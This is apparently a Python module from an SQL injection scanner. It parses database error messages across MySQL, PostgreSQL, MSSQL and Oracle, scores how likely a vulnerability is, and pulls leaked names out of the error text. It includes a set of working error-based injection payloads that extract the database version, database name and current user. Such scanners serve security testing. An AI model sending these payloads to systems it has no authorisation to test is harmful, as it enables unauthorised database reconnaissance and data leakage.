"""
Enhanced error-based SQL injection detection with intelligent error parsing.
"""
import re
from typing import List, Dict, Tuple, Optional, Set
from dataclasses import dataclass
import logging
from enum import Enum

from .payloads import SQLiPayloads

logger = logging.getLogger(__name__)

class ErrorSeverity(Enum):
    """Severity levels for SQL errors"""
    HIGH = "high"       # Direct SQL syntax errors
    MEDIUM = "medium"   # Database-specific errors
    LOW = "low"         # Generic or ambiguous errors

@dataclass
class ParsedSQLError:
    """Parsed SQL error with metadata"""
    raw_error: str
    error_type: str
    severity: ErrorSeverity
    database_type: Optional[str]
    extracted_data: Dict[str, str]
    line_number: Optional[int] = None
    position: Optional[int] = None

class EnhancedErrorDetector:
    """Enhanced error-based SQL injection detector"""
    
    def __init__(self):
        self.payloads = SQLiPayloads()
        
        # Comprehensive error patterns with capture groups
        self.error_patterns = [
            # MySQL patterns
            (r"MySQLSyntaxErrorException:\s*(.*?)at line", 
             "mysql", ErrorSeverity.HIGH, {"error": "syntax"}),
            (r"You have an error in your SQL syntax.*near\s*['\"](.*?)['\"]", 
             "mysql", ErrorSeverity.HIGH, {"near": "sql_syntax"}),
            (r"check the manual that corresponds to your MySQL server version.*Version:\s*(\d+\.\d+\.\d+)", 
             "mysql", ErrorSeverity.MEDIUM, {"version": "mysql_version"}),
            
            # PostgreSQL patterns
            (r"PostgreSQL.*ERROR:\s*(.*?)\n", 
             "postgresql", ErrorSeverity.HIGH, {"error": "postgres_error"}),
            (r"ERROR:\s*syntax error at or near \"(.*?)\"", 
             "postgresql", ErrorSeverity.HIGH, {"near": "sql_syntax"}),
            (r"PG::SyntaxError.*ERROR:\s*(.*)", 
             "postgresql", ErrorSeverity.HIGH, {"error": "pg_error"}),
            
            # MSSQL patterns
            (r"Microsoft OLE DB Provider for SQL Server.*error\s*'(.*?)'", 
             "mssql", ErrorSeverity.HIGH, {"error": "oledb_error"}),
            (r"Unclosed quotation mark before the character string '(.*?)'", 
             "mssql", ErrorSeverity.HIGH, {"string": "unclosed_string"}),
            (r"Incorrect syntax near '(.*?)'", 
             "mssql", ErrorSeverity.HIGH, {"near": "syntax_error"}),
            
            # Oracle patterns
            (r"ORA-(\d{5}):\s*(.*)", 
             "oracle", ErrorSeverity.HIGH, {"code": "ora_code", "message": "ora_message"}),
            (r"PLS-(\d{5}):\s*(.*)", 
             "oracle", ErrorSeverity.HIGH, {"code": "pls_code", "message": "pls_message"}),
            
            # Generic patterns
            (r"SQL\w*[Ee]rror.*['\"](.*?)['\"]", 
             "generic", ErrorSeverity.MEDIUM, {"error": "generic_sql"}),
            (r"Warning.*mysql_", 
             "mysql", ErrorSeverity.LOW, {"warning": "mysql_warning"}),
            (r"Division by zero", 
             "generic", ErrorSeverity.MEDIUM, {"error": "division_zero"}),
        ]
        
        # Payloads that trigger specific types of errors
        self.diagnostic_payloads = {
            'version': [
                ("mysql", "' AND 1=CONCAT(0x5e,@@version,0x5e) AND '1'='1"),
                ("postgresql", "' AND 1=CAST((SELECT version()) AS INTEGER)--"),
                ("mssql", "' AND 1=CONVERT(int,@@version)--"),
                ("oracle", "' AND 1=(SELECT RAWTOHEX(DBMS_XMLGEN.getxml('SELECT banner FROM v$version WHERE rownum=1')) FROM DUAL)--"),
            ],
            'database_name': [
                ("mysql", "' AND 1=CONCAT(0x5e,database(),0x5e) AND '1'='1"),
                ("postgresql", "' AND 1=CAST((SELECT current_database()) AS INTEGER)--"),
                ("mssql", "' AND 1=CONVERT(int,db_name())--"),
                ("oracle", "' AND 1=(SELECT RAWTOHEX(DBMS_XMLGEN.getxml('SELECT name FROM v$database')) FROM DUAL)--"),
            ],
            'user': [
                ("mysql", "' AND 1=CONCAT(0x5e,user(),0x5e) AND '1'='1"),
                ("postgresql", "' AND 1=CAST((SELECT current_user) AS INTEGER)--"),
                ("mssql", "' AND 1=CONVERT(int,user_name())--"),
                ("oracle", "' AND 1=(SELECT RAWTOHEX(DBMS_XMLGEN.getxml('SELECT user FROM dual')) FROM DUAL)--"),
            ],
        }
    
    def parse_error(self, error_text: str) -> List[ParsedSQLError]:
        """
        Parse SQL error text to extract structured information.
        
        Args:
            error_text: Raw error text from response
            
        Returns:
            List of parsed SQL errors
        """
        parsed_errors = []
        
        for pattern, db_type, severity, capture_keys in self.error_patterns:
            matches = re.finditer(pattern, error_text, re.IGNORECASE | re.DOTALL)
            
            for match in matches:
                extracted_data = {}
                
                # Extract captured groups
                for i, key in enumerate(capture_keys.keys(), 1):
                    if i <= len(match.groups()):
                        value = match.group(i)
                        if value:
                            extracted_data[key] = value
                
                # Try to extract line number and position
                line_num = None
                position = None
                
                # Look for line numbers in error
                line_match = re.search(r'line\s*(\d+)', error_text, re.IGNORECASE)
                if line_match:
                    line_num = int(line_match.group(1))
                
                # Look for character positions
                pos_match = re.search(r'character\s*(\d+)', error_text, re.IGNORECASE)
                if pos_match:
                    position = int(pos_match.group(1))
                
                parsed_error = ParsedSQLError(
                    raw_error=match.group(0)[:200],  # Truncate for storage
                    error_type=list(capture_keys.values())[0],
                    severity=severity,
                    database_type=db_type,
                    extracted_data=extracted_data,
                    line_number=line_num,
                    position=position
                )
                
                parsed_errors.append(parsed_error)
        
        # Sort by severity (high first)
        parsed_errors.sort(key=lambda x: x.severity.value, reverse=True)
        
        return parsed_errors
    
    def extract_data_from_errors(self, error_text: str) -> Dict[str, any]:
        """
        Extract valuable data from SQL error messages.
        
        Args:
            error_text: Error text containing SQL errors
            
        Returns:
            Dictionary with extracted data
        """
        extracted = {
            'version': None,
            'database_name': None,
            'username': None,
            'table_names': [],
            'column_names': [],
            'query_fragments': [],
            'errors': []
        }
        
        parsed_errors = self.parse_error(error_text)
        extracted['errors'] = [err.__dict__ for err in parsed_errors]
        
        # Extract version information
        version_patterns = [
            (r'Version:\s*(\d+\.\d+\.\d+)', 'version'),
            (r'MySQL\s*(\d+\.\d+\.\d+)', 'version'),
            (r'PostgreSQL\s*(\d+\.\d+(?:\.\d+)?)', 'version'),
            (r'SQL Server\s*(\d+\.\d+\.\d+\.\d+)', 'version'),
            (r'Oracle.*Release\s*(\d+\.\d+\.\d+\.\d+)', 'version'),
        ]
        
        for pattern, key in version_patterns:
            match = re.search(pattern, error_text, re.IGNORECASE)
            if match:
                extracted['version'] = match.group(1)
                break
        
        # Extract database/table/column names from error messages
        name_patterns = [
            # Table names
            (r"Table\s*['\"](\w+)['\"]", 'table_names'),
            (r"FROM\s*['\"]?(\w+)['\"]?", 'table_names'),
            (r"into\s*['\"]?(\w+)['\"]?", 'table_names'),
            
            # Column names
            (r"Column\s*['\"](\w+)['\"]", 'column_names'),
            (r"Unknown column\s*['\"](\w+)['\"]", 'column_names'),
            (r"field\s*['\"]?(\w+)['\"]?", 'column_names'),
            
            # Database names
            (r"Database\s*['\"](\w+)['\"]", 'database_name'),
            (r"Unknown database\s*['\"](\w+)['\"]", 'database_name'),
            
            # Usernames
            (r"Access denied for user\s*['\"](\w+)['\"]", 'username'),
            (r"User\s*['\"](\w+)['\"]", 'username'),
        ]
        
        for pattern, key in name_patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            if matches:
                if key in ['table_names', 'column_names']:
                    extracted[key].extend(matches)
                else:
                    extracted[key] = matches[0]
        
        # Extract SQL query fragments
        query_patterns = [
            r"near\s*['\"](.*?)['\"]",
            r"syntax error at or near \"(.*?)\"",
            r"Unclosed quotation mark before the character string '(.*?)'",
        ]
        
        for pattern in query_patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            extracted['query_fragments'].extend(matches)
        
        # Remove duplicates
        extracted['table_names'] = list(set(extracted['table_names']))
        extracted['column_names'] = list(set(extracted['column_names']))
        extracted['query_fragments'] = list(set(extracted['query_fragments']))
        
        return extracted
    
    def generate_diagnostic_payloads(self, target_data: str = None) -> List[Tuple[str, str]]:
        """
        Generate diagnostic payloads to extract specific information.
        
        Args:
            target_data: Type of data to extract ('version', 'database_name', 'user')
            
        Returns:
            List of (database_type, payload) tuples
        """
        if target_data and target_data in self.diagnostic_payloads:
            return self.diagnostic_payloads[target_data]
        
        # Return all diagnostic payloads if no target specified
        all_payloads = []
        for category in self.diagnostic_payloads.values():
            all_payloads.extend(category)
        
        return all_payloads
    
    def assess_error_based_vulnerability(self, error_text: str, 
                                        baseline_text: str) -> Tuple[bool, float, Dict]:
        """
        Assess if error text indicates a SQL injection vulnerability.
        
        Args:
            error_text: Text containing potential SQL errors
            baseline_text: Baseline response for comparison
            
        Returns:
            Tuple of (is_vulnerable, confidence, evidence)
        """
        parsed_errors = self.parse_error(error_text)
        
        if not parsed_errors:
            return False, 0.0, {}
        
        # Calculate confidence based on error characteristics
        confidence_factors = []
        evidence = {
            'parsed_errors': [err.__dict__ for err in parsed_errors],
            'extracted_data': self.extract_data_from_errors(error_text)
        }
        
        for error in parsed_errors:
            # Severity-based confidence
            severity_confidence = {
                ErrorSeverity.HIGH: 0.8,
                ErrorSeverity.MEDIUM: 0.5,
                ErrorSeverity.LOW: 0.2
            }.get(error.severity, 0.1)
            
            confidence_factors.append(severity_confidence)
            
            # Database-specific errors increase confidence
            if error.database_type != 'generic':
                confidence_factors.append(0.1)
        
        # Check if error contains SQL syntax elements not in baseline
        sql_keywords = ['SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE']
        baseline_has_sql = any(keyword.lower() in baseline_text.lower() 
                              for keyword in sql_keywords)
        error_has_sql = any(keyword.lower() in error_text.lower() 
                           for keyword in sql_keywords)
        
        if error_has_sql and not baseline_has_sql:
            confidence_factors.append(0.3)
        
        # Calculate final confidence
        if confidence_factors:
            confidence = sum(confidence_factors) / len(confidence_factors)
            # Cap at 0.95 to leave room for manual verification
            confidence = min(confidence, 0.95)
            
            # Strong indicator: Multiple different types of errors
            if len(parsed_errors) > 1:
                error_types = set(err.error_type for err in parsed_errors)
                if len(error_types) > 1:
                    confidence = min(confidence * 1.2, 0.95)
            
            return True, confidence, evidence
        
        return False, 0.0, {}

# Test function
def test_error_detector():
    """Test the enhanced error detector"""
    detector = EnhancedErrorDetector()
    
    # Test error parsing
    test_errors = [
        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT * FROM users' at line 1",
        "ERROR: syntax error at or near \"SELECT\" at character 15",
        "ORA-00933: SQL command not properly ended",
        "Unclosed quotation mark before the character string 'test'.",
    ]
    
    print("Error parsing test:")
    for error in test_errors:
        parsed = detector.parse_error(error)
        print(f"\n'{error[:60]}...'")
        print(f"  Parsed {len(parsed)} errors")
        if parsed:
            print(f"  First error type: {parsed[0].error_type}")
            print(f"  Database: {parsed[0].database_type}")
            print(f"  Severity: {parsed[0].severity}")
    
    # Test data extraction
    complex_error = """
    Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/test.php on line 42
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT id, name FROM users WHERE id = '1'' at line 1
    """
    
    extracted = detector.extract_data_from_errors(complex_error)
    print(f"\nData extraction from complex error:")
    print(f"  Tables: {extracted['table_names']}")
    print(f"  Columns: {extracted['column_names']}")
    print(f"  Query fragments: {extracted['query_fragments']}")
    
    # Test vulnerability assessment
    baseline = "Welcome to our website"
    error_text = "MySQLSyntaxErrorException: Unknown column 'admin' in 'where clause'"
    
    is_vuln, confidence, evidence = detector.assess_error_based_vulnerability(
        error_text, baseline
    )
    
    print(f"\nVulnerability assessment:")
    print(f"  Is vulnerable: {is_vuln}")
    print(f"  Confidence: {confidence:.2f}")
    
    return detector

if __name__ == "__main__":
    test_error_detector()